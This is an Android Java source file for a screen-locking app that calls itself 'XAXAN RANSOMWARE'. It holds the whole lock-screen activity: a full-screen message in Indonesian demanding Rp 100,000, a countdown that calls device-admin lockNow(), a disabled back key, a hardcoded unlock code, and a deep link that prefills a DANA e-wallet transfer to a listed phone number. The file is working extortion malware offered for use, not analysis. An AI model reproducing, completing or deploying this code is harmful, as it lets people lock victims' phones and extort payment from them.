package com.xaxan.locker;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Handler;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

public class LockScreenActivity extends Activity {
    
    private DevicePolicyManager dpm;
    private ComponentName admin;
    private EditText etPass;
    private TextView tvTimer;
    private TextView tvDana;
    private Button btnDana;
    private CountDownTimer timer;
    private int detik = 20;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN |
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED, 
                WindowManager.LayoutParams.FLAG_FULLSCREEN);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setTurnScreenOn(true);
            getWindow().addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD);
        }
        
        setContentView(R.layout.activity_lock);
        
        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        admin = new ComponentName(this, AdminReceiver.class);
        
        TextView tvTitle = findViewById(R.id.tvLockTitle);
        TextView tvMessage = findViewById(R.id.tvLockMessage);
        TextView tvHacker = findViewById(R.id.tvHacker);
        tvDana = findViewById(R.id.tvDana);
        btnDana = findViewById(R.id.btnDana);
        etPass = findViewById(R.id.etPassword);
        Button btnUnlock = findViewById(R.id.btnUnlock);
        tvTimer = findViewById(R.id.tvTimer);
        
        tvTitle.setText("🔒 XAXAN RANSOMWARE");
        tvMessage.setText("PERANGKAT ANDA TELAH DIKUNCI!\n\nSilahkan transfer Rp 100.000 ke DANA di bawah:");
        tvHacker.setText("HACKER BY XAXAN");
        
        // NOMOR DANA LO - UDAH GUA GANTI
        tvDana.setText("📱 NO DANA: 6282312534774\n\nKlik tombol DANA untuk langsung transfer");
        
        btnDana.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                bukaDana();
            }
        });
        
        timer = new CountDownTimer(20000, 1000) {
            public void onTick(long millisUntilFinished) {
                detik = (int) millisUntilFinished / 1000;
                tvTimer.setText("⏳ SISA WAKTU: " + detik + " detik");
                
                if (detik <= 5) {
                    tvTimer.setTextColor(0xFFFF0000);
                }
            }
            
            public void onFinish() {
                tvTimer.setText("⚠️ WAKTU HABIS! LOCK LAGI");
                if (dpm.isAdminActive(admin)) {
                    dpm.lockNow();
                }
            }
        }.start();
        
        btnUnlock.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String pass = etPass.getText().toString();
                
                if (pass.equals("123456")) {
                    timer.cancel();
                    Toast.makeText(LockScreenActivity.this, "✅ KODE BENAR! MEMBUKA...", Toast.LENGTH_LONG).show();
                    
                    if (dpm.isAdminActive(admin)) {
                        dpm.removeActiveAdmin(admin);
                    }
                    
                    new Handler().postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            finishAffinity();
                        }
                    }, 2000);
                    
                } else {
                    Toast.makeText(LockScreenActivity.this, "❌ KODE SALAH!", Toast.LENGTH_SHORT).show();
                    etPass.setText("");
                    
                    if (detik > 2) {
                        timer.cancel();
                        timer = new CountDownTimer((detik - 2) * 1000, 1000) {
                            public void onTick(long millis) {
                                detik = (int) millis / 1000;
                                tvTimer.setText("⏳ SISA WAKTU: " + detik + " detik");
                            }
                            public void onFinish() {
                                tvTimer.setText("⚠️ WAKTU HABIS!");
                                if (dpm.isAdminActive(admin)) {
                                    dpm.lockNow();
                                }
                            }
                        }.start();
                    }
                }
            }
        });
    }
    
    private void bukaDana() {
        String noDana = "6282312534774"; // NOMOR LO UDAH GUA SET
        
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setData(Uri.parse("dana://wallet/transfer?phone=" + noDana + "&amount=100000"));
            intent.setPackage("id.dana");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            
            if (intent.resolveActivity(getPackageManager()) != null) {
                startActivity(intent);
                Toast.makeText(this, "✅ BUKA DANA... LANGSUNG TF", Toast.LENGTH_LONG).show();
            } else {
                Intent playStore = new Intent(Intent.ACTION_VIEW);
                playStore.setData(Uri.parse("market://details?id=id.dana"));
                startActivity(playStore);
                Toast.makeText(this, "⚠️ INSTALL DANA DULU!", Toast.LENGTH_LONG).show();
            }
        } catch (Exception e) {
            try {
                Intent browser = new Intent(Intent.ACTION_VIEW);
                browser.setData(Uri.parse("https://link.dana.id/qr/123456"));
                startActivity(browser);
            } catch (Exception ex) {
                Toast.makeText(this, "GAGAL BUKA DANA", Toast.LENGTH_SHORT).show();
            }
        }
    }
    
    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (timer != null) {
            timer.cancel();
        }
    }
}